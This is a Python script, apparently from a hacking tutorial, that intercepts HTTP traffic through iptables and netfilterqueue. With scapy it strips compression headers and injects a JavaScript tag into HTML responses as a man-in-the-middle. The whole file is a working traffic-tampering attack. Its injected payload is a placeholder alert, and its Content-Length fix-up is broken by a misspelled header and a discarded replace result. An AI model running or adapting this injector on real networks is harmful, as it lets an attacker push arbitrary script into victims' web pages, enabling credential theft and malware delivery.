import netfilterqueue as nfq
from termcolor import colored
from os import getuid
from subprocess import call
import scapy.all as scapy
from re import sub, search

code_inject = b"<script>alert('hello')</script>"


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):

        if scapy_packet[scapy.TCP].dport == 80:
            # REQUEST
            # change the encode for plain text
            modified_load = sub(b'Accept-Encoding:.*?\\r\\n',
                                b'', scapy_packet[scapy.Raw].load)
            scapy_packet[scapy.Raw].load = modified_load
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(bytes(scapy_packet))

        elif scapy_packet[scapy.TCP].sport == 80:
            # RESPONSE
            index = scapy_packet[scapy.Raw].load.find(b'</body>')
            content_lenght = search("(?:Content-Lenght:\s)(\d*)", str(scapy_packet[scapy.Raw].load))
            
            if content_lenght and b"text/html" in scapy_packet[scapy.Raw].load:
                modified_content_lenght = int(content_lenght.group(1)) + len(code_inject)
                scapy_packet[scapy.Raw].load.replace(content_lenght.group(1), str(modified_content_lenght))

            if index != -1:
                modified_load = scapy_packet[scapy.Raw].load[:index] + \
                    code_inject + scapy_packet[scapy.Raw].load[index:]
                scapy_packet[scapy.Raw].load = modified_load
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                print(f"\nModified load: {colored(scapy_packet[scapy.Raw].load, 'blue')}")
                packet.set_payload(bytes(scapy_packet))
                print(f"{colored('[*]', 'green')} Load Done")
    packet.accept()


def check_sudo():
    if getuid() != 0:
        print(
            f"{colored('[-]', 'red')} You must be super user to run this script")
        exit(1)


check_sudo()
call('iptables -I INPUT -j NFQUEUE --queue-num 1', shell=True)
call('iptables -I OUTPUT -j NFQUEUE --queue-num 1', shell=True)
queue = nfq.NetfilterQueue()

queue.bind(1, process_packet)
try:
    print(f"{colored('[!]', 'cyan')} Running")
    queue.run()
except KeyboardInterrupt:
    print(f"\n{colored('[!]', 'red')} Exit")
    call('iptables -D INPUT -j NFQUEUE --queue-num 1', shell=True)
    call('iptables -D OUTPUT -j NFQUEUE --queue-num 1', shell=True)
